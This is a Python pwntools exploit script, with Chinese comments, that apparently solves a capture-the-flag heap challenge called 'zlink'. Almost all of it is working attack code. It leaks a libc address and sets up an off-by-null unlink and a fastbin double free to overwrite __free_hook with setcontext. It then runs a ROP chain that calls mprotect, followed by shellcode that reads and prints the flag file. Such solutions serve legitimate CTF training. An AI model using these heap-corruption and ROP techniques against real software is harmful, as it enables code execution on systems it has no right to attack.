#encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']
context.arch = 'amd64'
p = process("./zlink")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(id,size,content):
    p.sendlineafter("Your choice :",str(1))
    p.sendlineafter("Index:",str(id))
    p.sendlineafter("Size of Heap : ",str(size))
    p.sendafter("Content?:",content)
def delete(id):
    p.sendlineafter("Your choice :",str(2))
    p.sendlineafter("Index:",str(id))   
def show(id):
    p.sendlineafter("Your choice :",str(5))
    p.sendlineafter("Index :",str(id))
def edit(id,content):
    p.sendlineafter("Your choice :",str(6))
    p.sendlineafter("Index:",str(id))
    p.sendafter("Content?:",content)

add(0,0x68,'skye')#用于 fastbin double 隔断
add(1,0x70,'skye')#0x100    在0x100前面留些空间，用于等下申请0x100时整理fastbin放入unsortedbin里面泄露出地址，然后用0x100来形成unlink攻击
add(2,0x70,'skye')#0x100

delete(1)
delete(2)
p.sendlineafter("Your choice :",str(4))#14 15   整理fastbin放入unsortedbin
add(1,0x20,'a')
show(1)
libc_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-(0x7fdaa6b4cc61-0x7fdaa6788000)
log.info("libc_addr:"+hex(libc_addr))

add(2,0x58,'a')#padding
add(10,0x68,p64(libc_addr+0x3c4b80-0x18)+p64(libc_addr+0x3c4b80-0x10))  #offbynull
                                                                        #绕过unlink检查，就是让fd->bk=p;bk->fd=p;在main_arean能找到相应的指针
delete(14)#触发unlink合并
add(3,0x68,'a')#形成双指针指向同一地址

delete(10)#fastbin double free
delete(0)
delete(3)

add(3,0x68,p64(libc_addr+libc.sym['__free_hook']-0x18))
add(0,0x68,"skye")
add(4,0x68,"skye")
edit(4,'skyeyyds')#在freehook上面写一个0x7f，用fastbin分配过去
add(5,0x68,p64(0)+p64(libc_addr+libc.sym['setcontext']+53))
add(6,0x50,'\x00')

pop_rdi_ret = libc_addr + 0x0000000000021112
pop_rsi_ret = libc_addr + 0x00000000000202f8
pop_rdx_ret = libc_addr + 0x0000000000001b92
leave_ret = libc_addr + 0x0000000000042361
ret = libc_addr + 0x0000000000000937

libc.address = libc_addr
add(7,0x70,"A"*0x8+p64(0)+p64(libc.address+0x3c6000)+p64(0)+p64(0)+p64(0x100)+p64(0)*2+p64(libc.address+0x3c6000)+p64(libc.address+0xbc3f5))


print hex(libc_addr+libc.sym['__free_hook']-0x18)
gdb.attach(p,"b *$rebase(0x11BB)")
raw_input()

delete(6)

pause()
payload = [ #mprotect
    libc.address + 0x0000000000021112,#pop_rdi_ret
    libc.address + 0x3c6000,#bss
    libc.address + 0x00000000000202f8,#pop_rsi_ret
    0x2000,
    libc.address + 0x0000000000001b92,#pop_rdx_ret
    7,
    libc.address + 0x000000000003a738,#pop_rax_ret
    10,
    libc.address + 0x00000000000bc3f5,#syscall_ret
    libc.address + 0x0000000000002a71 #jmp rsp
]
shellcode = asm('''
    sub rsp, 0x800
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    mov eax, 2
    syscall
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x30
    xor eax, eax
    syscall
    mov edx, eax
    mov rsi, rsp
    mov edi, 1
    mov eax, edi
    syscall
''')
p.send(flat(payload) + shellcode)

p.interactive()